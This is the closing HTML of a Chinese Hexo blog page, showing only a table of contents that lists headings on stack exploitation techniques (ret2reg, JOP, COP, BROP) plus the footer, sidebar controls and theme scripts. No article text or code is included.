class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.4.</span> <span class="toc-text">其他字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2reg"><span class="toc-number">1.2.</span> <span class="toc-text">ret2reg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JOP"><span class="toc-number">1.2.2.</span> <span class="toc-text">JOP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#COP"><span class="toc-number">1.2.3.</span> <span class="toc-text">COP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BROP"><span class="toc-number">1.2.4.</span> <span class="toc-text">BROP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">基本原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">攻击条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">栈溢出长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stack-Reading"><span class="toc-number">1.2.4.5.</span> <span class="toc-text">Stack Reading</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Blind-ROP"><span class="toc-number">1.2.4.6.</span> <span class="toc-text">Blind ROP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">1.2.5.</span> <span class="toc-text">示例复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%A0%88%E6%BA%A2%E5%87%BA%E7%A9%BA%E9%97%B4%E5%A4%A7%E5%B0%8F"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">判断栈溢出空间大小</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEstop-gadget"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">寻找stop gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEbrop-gadget"><span class="toc-number">1.2.5.3.</span> <span class="toc-text">寻找brop gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEputs-plt%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.5.4.</span> <span class="toc-text">寻找puts@plt地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2puts-got%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.5.5.</span> <span class="toc-text">泄露puts_got地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.5.6.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.3.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By HalloH</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>